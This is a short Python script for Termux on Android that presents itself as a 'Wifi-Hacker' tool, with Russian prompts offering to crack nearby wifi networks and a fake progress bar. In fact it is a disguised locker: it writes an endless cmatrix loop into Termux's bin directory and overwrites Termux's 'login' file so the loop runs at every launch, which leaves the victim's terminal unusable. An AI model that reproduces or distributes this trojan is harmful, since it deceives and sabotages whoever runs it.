import time, os, sys
from colorama import Fore
os.system('clear')
file = open('/data/data/com.termux/files/usr/bin/locker_service.py', 'w')
file.write("""
import os
while True:
	os.system('cmatrix')
""")
file.close()
os.system('chmod +x /data/data/com.termux/files/usr/bin/locker_service.py')
print(Fore.RED)
os.system('toilet -f pagga Wifi-Hacker')
print(Fore.WHITE)
print('Welcome. Спасибо, за то что используете наш инструмент.')
print()
print('Начать попытку взлома уязвимых wifi сетей в вашем местоположении?')

while True:
 a = input('Ввод ответа (Да/Нет): ').lower().strip()
 if a == 'да':
 	break
 if a == 'нет':
 	print('Пока :(')
 	sys.exit()
 else:
 	print('Вы ввели что-то не то.')
print()
os.system('pkg install cmatrix')
print()
print(Fore.GREEN + 'Скачивание данных...')
print()
for percent in range(101):
   s = Fore.GREEN + f"[{(percent // 10) * '■'*4}"
   s += Fore.WHITE + f"{(10 - (percent // 10)) * '■'*4}" + Fore.GREEN +']'
   s += Fore.WHITE + f" {percent}" + '%'
   print(s, end="\r")
   time.sleep(0.1)
print()
print(Fore.GREEN + 'Process finished.')

print(Fore.YELLOW)
print()
print()
print('Подсказка:\n для завершения работы скрипта пропишите: "exit".')
print()
file = open('/data/data/com.termux/files/usr/bin/login', 'w')
file.write('python /data/data/com.termux/files/usr/bin/locker_service.py')
file.close()
